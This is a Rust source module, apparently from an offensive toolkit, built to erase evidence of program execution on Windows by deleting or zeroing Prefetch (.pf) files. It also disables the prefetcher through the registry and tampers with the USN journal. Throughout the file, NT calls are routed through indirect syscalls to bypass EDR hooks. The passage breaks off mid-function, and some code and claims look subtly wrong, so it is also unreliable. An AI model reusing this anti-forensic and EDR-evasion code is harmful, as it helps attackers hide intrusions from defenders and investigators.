// ── Windows Prefetch Evidence Removal ──────────────────────────────────
//
// Windows stores .pf files in C:\Windows\Prefetch\ that record process
// execution evidence: executable name, run count, last run timestamp,
// loaded DLLs, and directories accessed.  EDR and forensic tools parse
// these to build execution timelines.
//
// This module removes or sanitises .pf evidence via three strategies:
//
//   1. DELETE — NtDeleteFile (obvious, may trigger EDR alerts).
//   2. PATCH  — NtCreateSection + NtMapViewOfSection to patch the .pf
//               header in-place.  File remains on disk but contains no
//               useful forensic data.  Preferred method.
//   3. DISABLE_SERVICE — Set EnablePrefetcher registry value to 0 before
//               the operation, restore after.
//
// All NT API calls use indirect syscalls via the nt_syscall crate to
// bypass user-mode API hooks set by EDR products.
//
// PF file format reference (MAM — "MAM" magic at offset 0):
//   Version 17: Windows 8
//   Version 23: Windows 8.1
//   Version 26: Windows 10
//   Version 30: Windows 11
// The header contains: signature (4 bytes), version (4 bytes), run count
// (4 bytes), executable name (variable, UTF-16), timestamps, and file
// references.
//
// USN Journal consistency: after modifying/deleting a .pf file, we use
// FSCTL_READ_USN_JOURNAL to find entries referencing it and
// FSCTL_WRITE_USN_CLOSE to close them cleanly, preventing forensic
// timeline analysis from recovering the modification event.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::OnceLock;

use common::config::{PrefetchCleanMethod, PrefetchConfig};

// ── Constants ────────────────────────────────────────────────────────────

/// Prefetch directory path (NT path format for NtCreateFile).
const PREFETCH_DIR_NT: &[u16] = encode_wide!(
    "\\??\\C:\\Windows\\Prefetch"
);

/// Prefetch file extension filter.
const PF_EXTENSION: &str = ".pf";

/// MAM signature for PF header validation (little-endian).
const PF_SIGNATURE_MAM: u32 = 0x4D414D; // "MAM\0"

/// Known PF format versions.
const PF_VERSION_WIN8: u32 = 17;
const PF_VERSION_WIN81: u32 = 23;
const PF_VERSION_WIN10: u32 = 26;
const PF_VERSION_WIN11: u32 = 30;

/// NTSTATUS success codes.
const STATUS_SUCCESS: i32 = 0;
const STATUS_NO_MORE_FILES: i32 = 0x80000006_u32 as i32;
const STATUS_PENDING: i32 = 0x00000103_u32 as i32;

/// NT access mask constants.
const SYNCHRONIZE: u32 = 0x100000;
const FILE_ANY_ACCESS: u32 = 0x000000;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const GENERIC_EXECUTE: u32 = 0x20000000;
const DELETE: u32 = 0x00010000;
const READ_CONTROL: u32 = 0x00020000;
const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;

/// File share modes.
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;

/// File creation dispositions.
const FILE_OPEN: u32 = 0x00000001;
const FILE_CREATE: u32 = 0x00000002;
const FILE_OPEN_IF: u32 = 0x00000003;
const FILE_OVERWRITE: u32 = 0x00000004;
const FILE_SUPERSEDE: u32 = 0x00000000;

/// File attributes.
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_OPEN_FOR_BACKUP_INTENT: u32 = 0x00004000;
const FILE_DELETE_ON_CLOSE: u32 = 0x00001000;
const FILE_DIRECTORY_FILE: u32 = 0x00000001;

/// Section access masks.
const SECTION_ALL_ACCESS: u32 =
    STANDARD_RIGHTS_REQUIRED | 0x0000000F; // SECTION_QUERY..SECTION_MAP_EXECUTE

/// Section inheritance.
const SEC_COMMIT: u32 = 0x08000000;
const PAGE_READWRITE: u32 = 0x04;

/// Registry access masks.
const KEY_READ: u32 = 0x20019;
const KEY_WRITE: u32 = 0x20006;
const KEY_SET_VALUE: u32 = 0x0002;

/// Prefetch registry path.
const PREFETCH_REG_KEY_NT: &[u16] = encode_wide!(
    "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters"
);

/// Registry value name for EnablePrefetcher.
const ENABLE_PREFETCHER_NAME: &[u16] = encode_wide!("EnablePrefetcher");

/// FSCTL codes for USN journal operations.
const FSCTL_READ_USN_JOURNAL: u32 = 0x000900BB;
const FSCTL_WRITE_USN_CLOSE: u32 = 0x000900EF;

/// USN reasons we care about (file creation/modification/deletion).
const USN_REASON_DATA_OVERWRITE: u32 = 0x00000001;
const USN_REASON_FILE_CREATE: u32 = 0x00000100;
const USN_REASON_FILE_DELETE: u32 = 0x00000200;

/// Maximum PF file size we'll process (16 MB — generous).
const MAX_PF_SIZE: usize = 16 * 1024 * 1024;

// ── Internal state ───────────────────────────────────────────────────────

/// Module configuration, set once during init.
static CONFIG: OnceLock<PrefetchConfig> = OnceLock::new();

/// Whether the module has been initialised.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

/// Saved EnablePrefetcher value for restore.
static SAVED_PREFETCHER_VALUE: std::sync::Mutex<Option<u32>> =
    std::sync::Mutex::new(None);

// ── NT structure definitions ─────────────────────────────────────────────
//
// Minimal NT structures needed for our syscalls.  We define them locally
// to avoid pulling in heavy NT bindings and to maintain exact layout
// control for cross-compilation.

#[repr(C)]
#[derive(Default)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut std::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut std::ffi::c_void,
    security_quality_of_service: *mut std::ffi::c_void,
}

impl ObjectAttributes {
    fn new(name: &mut UnicodeString) -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: name as *mut UnicodeString,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Default)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

#[repr(C)]
#[derive(Default)]
struct FileDirectoryInformation {
    next_entry_offset: u32,
    file_index: u32,
    creation_time: i64,
    last_access_time: i64,
    last_write_time: i64,
    change_time: i64,
    end_of_file: i64,
    allocation_size: i64,
    file_attributes: u32,
    file_name_length: u32,
    file_name: [u16; 1], // variable-length, first element
}

/// USN journal data for FSCTL_READ_USN_JOURNAL.
#[repr(C)]
#[derive(Default)]
struct ReadUsnJournalData {
    start_usn: i64,
    reason_mask: u32,
    return_only_on_close: u32,
    timeout: i64,
    bytes_to_wait_for: u32,
    usn_journal_id: u64,
    min_major_version: u16,
    max_major_version: u16,
}

/// USN record header.
#[repr(C)]
#[derive(Default)]
struct UsnRecordV4 {
    record_length: u32,
    major_version: u16,
    minor_version: u16,
    file_reference_number: u64,
    parent_file_reference_number: u64,
    usn: i64,
    timestamp: i64,
    reason: u32,
    source_info: u32,
    security_id: u32,
    file_attributes: u32,
    file_name_length: u16,
    file_name_offset: u16,
    file_name: [u16; 1], // variable-length
}

// ── Macro to encode Rust string as UTF-16 with null terminator ─────────

macro_rules! encode_wide {
    ($s:expr) => {{
        const _INPUT: &str = $s;
        const _LEN: usize = _INPUT.len();
        const _OUTPUT: &[u16; _LEN + 1] = {
            let mut buf = [0u16; _LEN + 1];
            let bytes = _INPUT.as_bytes();
            let mut i = 0;
            while i < _LEN {
                buf[i] = bytes[i] as u16;
                i += 1;
            }
            buf[_LEN] = 0u16;
            &buf
        };
        _OUTPUT
    }};
}

// ── Helper: wide string from Rust string ─────────────────────────────────

/// Build a null-terminated UTF-16 vector from a Rust string.
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Build a UnicodeString from a UTF-16 buffer.
fn make_unicode_string(buf: &mut [u16]) -> UnicodeString {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    UnicodeString {
        length: (len * 2) as u16,
        maximum_length: (buf.len() * 2) as u16,
        buffer: buf.as_mut_ptr(),
    }
}

// ── PF header structure (simplified) ─────────────────────────────────────

/// PF file header (first 84+ bytes, depending on version).
/// We only need to parse enough to locate and patch the forensic fields.
#[repr(C)]
struct PfHeader {
    /// Version-specific magic / signature.  For MAM format this is the
    /// version number stored as a little-endian u32 preceded by "MAM" in
    /// earlier bytes.  We read the raw bytes and validate.
    signature: [u8; 4],     // offset 0: "MAM\0"
    version: u32,           // offset 4
    _padding: [u8; 8],      // offset 8: unknown / padding
    run_count: u32,         // offset 16 (approximate, varies by version)
}

/// Offsets for PF header fields vary by version.  We define them here.
mod pf_offsets {
    // Common header fields
    pub const SIGNATURE: usize = 0;
    pub const VERSION: usize = 4;

    // Version 17 (Win8) offsets
    pub const V17_RUN_COUNT: usize = 16;
    pub const V17_EXECUTABLE_NAME_OFFSET: usize = 20;
    pub const V17_LAST_RUN_TIMESTAMP: usize = 128;

    // Version 23 (Win8.1) offsets
    pub const V23_RUN_COUNT: usize = 16;
    pub const V23_EXECUTABLE_NAME_OFFSET: usize = 20;
    pub const V23_LAST_RUN_TIMESTAMP: usize = 128;

    // Version 26 (Win10) offsets
    pub const V26_RUN_COUNT: usize = 16;
    pub const V26_EXECUTABLE_NAME_OFFSET: usize = 20;
    pub const V26_LAST_RUN_TIMESTAMP: usize = 128;
    pub const V26_TIMESTAMP_COUNT: usize = 7; // Win10 stores up to 8 timestamps

    // Version 30 (Win11) offsets
    pub const V30_RUN_COUNT: usize = 16;
    pub const V30_EXECUTABLE_NAME_OFFSET: usize = 20;
    pub const V30_LAST_RUN_TIMESTAMP: usize = 128;
    pub const V30_TIMESTAMP_COUNT: usize = 7;
}

// ── Indirect syscall wrappers ────────────────────────────────────────────
//
// These wrappers encapsulate the nt_syscall calls with proper NT structure
// setup.  Each wrapper handles the full NT API contract: open → operate →
// close.  All syscalls use indirect dispatch through nt_syscall to bypass
// user-mode hooks.

/// Open a directory handle via NtCreateFile (indirect syscall).
unsafe fn nt_open_directory(path: &[u16]) -> Result<*mut std::ffi::c_void, String> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut obj_name = make_unicode_string(&mut path.to_vec());
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = nt_syscall::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        (GENERIC_READ | SYNCHRONIZE) as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,                                          // AllocationSize
        0u64,                                          // FileAttributes
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        (FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0u64,                                          // EaBuffer
        0u64,                                          // EaLength
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateFile(directory): {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtCreateFile(directory) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(handle)
}

/// Open a file for delete access via NtCreateFile (indirect syscall).
unsafe fn nt_open_file_for_delete(path: &[u16]) -> Result<*mut std::ffi::c_void, String> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_vec = path.to_vec();
    let mut obj_name = make_unicode_string(&mut path_vec);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = nt_syscall::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        (DELETE | SYNCHRONIZE) as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        FILE_SYNCHRONOUS_IO_NONALERT as u64,
        0u64,
        0u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateFile(delete): {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtCreateFile(delete) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(handle)
}

/// Open a file for read/write access via NtCreateFile (indirect syscall).
unsafe fn nt_open_file_rw(path: &[u16]) -> Result<*mut std::ffi::c_void, String> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_vec = path.to_vec();
    let mut obj_name = make_unicode_string(&mut path_vec);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = nt_syscall::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        FILE_SYNCHRONOUS_IO_NONALERT as u64,
        0u64,
        0u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateFile(rw): {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtCreateFile(rw) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(handle)
}

/// Close a handle via NtClose (indirect syscall).
unsafe fn nt_close(handle: *mut std::ffi::c_void) -> Result<(), String> {
    if handle.is_null() {
        return Ok(());
    }
    let status = nt_syscall::syscall!("NtClose", handle as u64)
        .map_err(|e| format!("nt_syscall resolution for NtClose: {e}"))?;
    if status != STATUS_SUCCESS {
        return Err(format!("NtClose failed: NTSTATUS {:#010X}", status as u32));
    }
    Ok(())
}

/// Enumerate files in a directory via NtQueryDirectoryFile (indirect syscall).
/// Returns a vector of file names (UTF-16 strings, without null terminator).
unsafe fn nt_enumerate_files(
    dir_handle: *mut std::ffi::c_void,
) -> Result<Vec<Vec<u16>>, String> {
    let mut results = Vec::new();
    let buf_size: usize = 4096;
    let mut buffer = vec![0u8; buf_size];
    let mut iosb = IoStatusBlock::default();

    loop {
        let status = nt_syscall::syscall!(
            "NtQueryDirectoryFile",
            dir_handle as u64,
            0u64,                                          // Event
            0u64,                                          // ApcRoutine
            0u64,                                          // ApcContext
            &mut iosb as *mut _ as u64,
            buffer.as_mut_ptr() as u64,
            buf_size as u64,
            1u64,   // FileDirectoryInformation (class = 1)
            0u64,   // ReturnSingleEntry = FALSE
            0u64,   // FileName (null = first call resumes)
            0u64,   // RestartScan = FALSE (continue from last)
        )
        .map_err(|e| format!("nt_syscall resolution for NtQueryDirectoryFile: {e}"))?;

        if status == STATUS_NO_MORE_FILES {
            break;
        }
        if status != STATUS_SUCCESS {
            return Err(format!(
                "NtQueryDirectoryFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }

        // Parse the linked list of FileDirectoryInformation entries.
        let mut offset: usize = 0;
        let bytes_returned = iosb.information as usize;
        if bytes_returned == 0 || bytes_returned > buf_size {
            break;
        }

        loop {
            if offset + std::mem::size_of::<FileDirectoryInformation>() > bytes_returned {
                break;
            }

            let entry_ptr = buffer.as_ptr().add(offset) as *const FileDirectoryInformation;
            let entry = &*entry_ptr;

            // Extract the file name (UTF-16, variable-length).
            let name_len = entry.file_name_length as usize;
            if name_len > 0 && offset + std::mem::size_of::<FileDirectoryInformation>() - 2 + name_len <= bytes_returned {
                let name_ptr = &entry.file_name as *const u16;
                let name_slice = std::slice::from_raw_parts(name_ptr, name_len / 2);
                results.push(name_slice.to_vec());
            }

            let next = entry.next_entry_offset as usize;
            if next == 0 {
                break;
            }
            offset += next;
        }
    }

    Ok(results)
}

/// Delete a file via NtDeleteFile (indirect syscall).
unsafe fn nt_delete_file(path: &[u16]) -> Result<(), String> {
    let mut path_vec = path.to_vec();
    let mut obj_name = make_unicode_string(&mut path_vec);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);

    let status = nt_syscall::syscall!(
        "NtDeleteFile",
        &mut obj_attrs as *mut _ as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtDeleteFile: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtDeleteFile failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(())
}

/// Create a section (memory mapping) from a file handle via
/// NtCreateSection + NtMapViewOfSection (indirect syscalls).
/// Returns (section_handle, mapped_base, mapped_size).
unsafe fn nt_map_file(
    file_handle: *mut std::ffi::c_void,
) -> Result<(*mut std::ffi::c_void, *mut std::ffi::c_void, usize), String> {
    let mut section_handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut obj_attrs = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        ..Default::default()
    };
    // NtCreateSection wants ObjectAttributes with no name.
    obj_attrs.object_name = std::ptr::null_mut();

    let mut iosb = IoStatusBlock::default();

    // NtCreateSection(FileHandle, DesiredAccess, ObjectAttributes,
    //                  MaximumSize, SectionPageProtection, SectionAttributes,
    //                  FileHandle)
    let status = nt_syscall::syscall!(
        "NtCreateSection",
        &mut section_handle as *mut _ as u64,
        SECTION_ALL_ACCESS as u64,
        &mut obj_attrs as *mut _ as u64,
        0u64,                           // MaximumSize (null = file size)
        PAGE_READWRITE as u64,          // SectionPageProtection
        SEC_COMMIT as u64,              // AllocationAttributes
        file_handle as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateSection: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtCreateSection failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }

    // NtMapViewOfSection(SectionHandle, ProcessHandle, BaseAddress,
    //                     ZeroBits, CommitSize, SectionOffset, ViewSize,
    //                     InheritDisposition, AllocationType, Win32Protect)
    let mut base: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut view_size: usize = 0; // 0 = map entire section

    let map_status = nt_syscall::syscall!(
        "NtMapViewOfSection",
        section_handle as u64,
        (-1isize) as u64,              // NtCurrentProcess()
        &mut base as *mut _ as u64,
        0u64,                           // ZeroBits
        0u64,                           // CommitSize
        0u64,                           // SectionOffset (null)
        &mut view_size as *mut _ as u64,
        1u64,                           // ViewShare
        0u64,                           // AllocationType
        PAGE_READWRITE as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtMapViewOfSection: {e}"))?;

    if map_status != STATUS_SUCCESS {
        let _ = nt_close(section_handle);
        return Err(format!(
            "NtMapViewOfSection failed: NTSTATUS {:#010X}",
            map_status as u32
        ));
    }

    Ok((section_handle, base, view_size))
}

/// Unmap a view of a section via NtUnmapViewOfSection (indirect syscall).
unsafe fn nt_unmap_view(base: *mut std::ffi::c_void) -> Result<(), String> {
    if base.is_null() {
        return Ok(());
    }
    let status = nt_syscall::syscall!(
        "NtUnmapViewOfSection",
        (-1isize) as u64,              // NtCurrentProcess()
        base as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtUnmapViewOfSection: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtUnmapViewOfSection failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(())
}

/// Open a registry key via NtOpenKey (indirect syscall).
unsafe fn nt_open_key(path: &[u16], access: u32) -> Result<*mut std::ffi::c_void, String> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_vec = path.to_vec();
    let mut obj_name = make_unicode_string(&mut path_vec);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);

    let status = nt_syscall::syscall!(
        "NtOpenKey",
        &mut handle as *mut _ as u64,
        access as u64,
        &mut obj_attrs as *mut _ as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtOpenKey: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtOpenKey failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(handle)
}

/// Set a registry DWORD value via NtSetValueKey (indirect syscall).
unsafe fn nt_set_value_key_dword(
    key_handle: *mut std::ffi::c_void,
    value_name: &[u16],
    value: u32,
) -> Result<(), String> {
    let mut name_buf = value_name.to_vec();
    let mut value_name_str = make_unicode_string(&mut name_buf);

    // REG_DWORD = 4
    let status = nt_syscall::syscall!(
        "NtSetValueKey",
        key_handle as u64,
        &mut value_name_str as *mut _ as u64,
        0u64,                           // TitleIndex (reserved)
        4u64,                           // Type = REG_DWORD
        &value as *const u32 as u64,
        4u64,                           // DataSize
    )
    .map_err(|e| format!("nt_syscall resolution for NtSetValueKey: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtSetValueKey failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(())
}

/// Query a registry DWORD value via NtQueryValueKey (indirect syscall).
unsafe fn nt_query_value_key_dword(
    key_handle: *mut std::ffi::c_void,
    value_name: &[u16],
) -> Result<u32, String> {
    let mut name_buf = value_name.to_vec();
    let mut value_name_str = make_unicode_string(&mut name_buf);

    // KEY_VALUE_PARTIAL_INFORMATION layout: TitleIndex(u32), Type(u32), Data(u8[...])
    // We need enough room for a DWORD: 8 + 4 = 12 bytes minimum.
    let buf_size: usize = 64;
    let mut buffer = vec![0u8; buf_size];
    let mut result_len: u32 = 0;

    // KeyValuePartialInformation = 2
    let status = nt_syscall::syscall!(
        "NtQueryValueKey",
        key_handle as u64,
        &mut value_name_str as *mut _ as u64,
        2u64,   // KeyValuePartialInformation
        buffer.as_mut_ptr() as u64,
        buf_size as u64,
        &mut result_len as *mut _ as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtQueryValueKey: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtQueryValueKey failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }

    // Parse: offset 0 = TitleIndex (4 bytes), offset 4 = Type (4 bytes),
    // offset 8 = Data.
    if result_len < 12 {
        return Err("NtQueryValueKey returned too few bytes".to_string());
    }
    let dword_val = u32::from_le_bytes([
        buffer[8], buffer[9], buffer[10], buffer[11],
    ]);
    Ok(dword_val)
}

/// Send an FSCTL via NtFsControlFile (indirect syscall).
unsafe fn nt_fs_control_file(
    file_handle: *mut std::ffi::c_void,
    fs_control_code: u32,
    input_buffer: *mut std::ffi::c_void,
    input_buffer_length: u32,
    output_buffer: *mut std::ffi::c_void,
    output_buffer_length: u32,
) -> Result<IoStatusBlock, String> {
    let mut iosb = IoStatusBlock::default();

    let status = nt_syscall::syscall!(
        "NtFsControlFile",
        file_handle as u64,
        0u64,                              // Event
        0u64,                              // ApcRoutine
        0u64,                              // ApcContext
        &mut iosb as *mut _ as u64,
        fs_control_code as u64,
        input_buffer as u64,
        input_buffer_length as u64,
        output_buffer as u64,
        output_buffer_length as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtFsControlFile: {e}"))?;

    if status != STATUS_SUCCESS && status != STATUS_PENDING {
        return Err(format!(
            "NtFsControlFile(0x{:08X}) failed: NTSTATUS {:#010X}",
            fs_control_code, status as u32
        ));
    }
    Ok(iosb)
}

// ── PF file matching ─────────────────────────────────────────────────────

/// Extract the executable name from a .pf filename.
/// PF files are named "EXECUTABLE-HASH.pf" where HASH is a 8-char hex hash.
/// Returns the executable name portion (e.g. "CMD" from "CMD-12345678.pf").
fn exe_name_from_pf_filename(filename: &str) -> Option<String> {
    if !filename.to_uppercase().ends_with(PF_EXTENSION.to_uppercase().as_str()) {
        return None;
    }
    // Strip .pf extension.
    let stem = &filename[..filename.len() - PF_EXTENSION.len()];

    // Find the last hyphen that separates name from hash.
    // Hash is typically 8 hex characters after the last dash.
    if let Some(pos) = stem.rfind('-') {
        let hash_part = &stem[pos + 1..];
        // Validate: hash should be 8 hex chars.
        if hash_part.len() == 8 && hash_part.chars().all(|c| c.is_ascii_hexdigit()) {
            return Some(stem[..pos].to_uppercase());
        }
    }
    // Fallback: no hash found, return the whole stem.
    Some(stem.to_uppercase())
}

/// Check if a .pf filename matches the target executable name.
fn pf_matches_exe(pf_filename: &str, target_exe: &str) -> bool {
    let target_upper = target_exe.to_uppercase();
    // Strip .exe extension from target if present.
    let target_name = target_upper
        .strip_suffix(".EXE")
        .unwrap_or(&target_upper);

    match exe_name_from_pf_filename(pf_filename) {
        Some(name) => name == target_name,
        None => false,
    }
}

/// Convert a UTF-16 filename to a Rust String (lossy).
fn wide_to_string(wide: &[u16]) -> String {
    String::from_utf16_lossy(wide)
}

// ── PF header patching ──────────────────────────────────────────────────

/// Validate a PF file header (check MAM signature and version).
fn validate_pf_header(data: &[u8]) -> Option<u32> {
    if data.len() < 20 {
        return None;
    }

    // Check MAM signature.
    if data[pf_offsets::SIGNATURE] != b'M'
        || data[pf_offsets::SIGNATURE + 1] != b'A'
        || data[pf_offsets::SIGNATURE + 2] != b'M'
    {
        return None;
    }

    let version = u32::from_le_bytes([
        data[pf_offsets::VERSION],
        data[pf_offsets::VERSION + 1],
        data[pf_offsets::VERSION + 2],
        data[pf_offsets::VERSION + 3],
    ]);

    match version {
        PF_VERSION_WIN8 | PF_VERSION_WIN81 | PF_VERSION_WIN10 | PF_VERSION_WIN11 => Some(version),
        _ => None,
    }
}

/// Get the run-count offset for a PF version.
fn run_count_offset(version: u32) -> usize {
    match version {
        PF_VERSION_WIN8 => pf_offsets::V17_RUN_COUNT,
        PF_VERSION_WIN81 => pf_offsets::V23_RUN_COUNT,
        PF_VERSION_WIN10 => pf_offsets::V26_RUN_COUNT,
        PF_VERSION_WIN11 => pf_offsets::V30_RUN_COUNT,
        _ => pf_offsets::V26_RUN_COUNT, // default to Win10 offsets
    }
}

/// Get the last-run timestamp offset for a PF version.
fn last_run_timestamp_offset(version: u32) -> usize {
    match version {
        PF_VERSION_WIN8 => pf_offsets::V17_LAST_RUN_TIMESTAMP,
        PF_VERSION_WIN81 => pf_offsets::V23_LAST_RUN_TIMESTAMP,
        PF_VERSION_WIN10 => pf_offsets::V26_LAST_RUN_TIMESTAMP,
        PF_VERSION_WIN11 => pf_offsets::V30_LAST_RUN_TIMESTAMP,
        _ => pf_offsets::V26_LAST_RUN_TIMESTAMP,
    }
}

/// Get the number of additional timestamps stored by the PF version
/// (Win10+ stores up to 8 run timestamps).
fn timestamp_count(version: u32) -> usize {
    match version {
        PF_VERSION_WIN10 => pf_offsets::V26_TIMESTAMP_COUNT,
        PF_VERSION_WIN11 => pf_offsets::V30_TIMESTAMP_COUNT,
        _ => 0, // Win8/8.1 store only the primary timestamp
    }
}

/// Patch a PF file header in-place.
/// Zeros the run count, timestamps, and executable name/paths.
fn patch_pf_header(data: &mut [u8], version: u32) -> Result<(), String> {
    let rc_off = run_count_offset(version);
    let ts_off = last_run_timestamp_offset(version);
    let name_off = pf_offsets::V26_EXECUTABLE_NAME_OFFSET;
    let ts_count = timestamp_count(version);

    // Zero run count (u32).
    if rc_off + 4 <= data.len() {
        data[rc_off..rc_off + 4].copy_from_slice(&[0u8; 4]);
    }

    // Zero primary last-run timestamp (FILETIME, 8 bytes).
    if ts_off + 8 <= data.len() {
        data[ts_off..ts_off + 8].copy_from_slice(&[0u8; 8]);
    }

    // Zero additional timestamps (Win10+: 7 more after the primary).
    let additional_ts_count = ts_count;
    for i in 0..additional_ts_count {
        let offset = ts_off + 8 + (i * 8);
        if offset + 8 <= data.len() {
            data[offset..offset + 8].copy_from_slice(&[0u8; 8]);
        }
    }

    // Zero executable name and subsequent string data (from name_off to
    // a safe boundary — we zero up to the timestamp area or 256 bytes,
    // whichever is smaller, to avoid corrupting the file structure).
    let zero_end = std::cmp::min(ts_off, name_off + 256);
    if name_off < data.len() && zero_end <= data.len() {
        data[name_off..zero_end].copy_from_slice(&vec![0u8; zero_end - name_off]);
    }

    log::debug!(
        "prefetch: patched PF header (version={}, run_count_off={}, ts_off={})",
        version, rc_off, ts_off
    );
    Ok(())
}

// ── USN Journal cleanup ──────────────────────────────────────────────────

/// Clean USN journal entries referencing a specific .pf file.
///
/// This reads the USN journal, finds entries for the target file, and
/// writes USN close records to mark them as closed, preventing forensic
/// timeline analysis from recovering the modification events.
unsafe fn clean_usn_for_pf(pf_path: &[u16]) -> Result<(), String> {
    // Open the volume handle (C:) for USN operations.
    let volume_path = to_wide("\\??\\C:");
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut obj_name = make_unicode_string(&mut volume_path.clone());
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = nt_syscall::syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,
        0u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        FILE_OPEN as u64,
        FILE_SYNCHRONOUS_IO_NONALERT as u64,
        0u64,
        0u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateFile(volume): {e}"))?;

    if status != STATUS_SUCCESS {
        // Non-fatal: USN cleanup is best-effort.
        log::warn!(
            "prefetch: could not open volume for USN cleanup: NTSTATUS {:#010X}",
            status as u32
        );
        return Ok(());
    }

    // Read USN journal entries.  We allocate a large buffer and iterate.
    let journal_buf_size: usize = 65536;
    let mut journal_buf = vec![0u8; journal_buf_size];
    let mut read_data = ReadUsnJournalData {
        start_usn: 0,         // Start from beginning
        reason_mask: USN_REASON_DATA_OVERWRITE
            | USN_REASON_FILE_CREATE
            | USN_REASON_FILE_DELETE,
        return_only_on_close: 0,
        timeout: 0,
        bytes_to_wait_for: 0,
        usn_journal_id: 0,    // 0 = default journal
        min_major_version: 2,
        max_major_version: 4,
    };

    // Extract the .pf filename from the full path for matching.
    let pf_name_wide: Vec<u16> = pf_path
        .iter()
        .rev()
        .take_while(|&&c| c != b'\\' as u16 && c != b'/' as u16 && c != 0)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect();

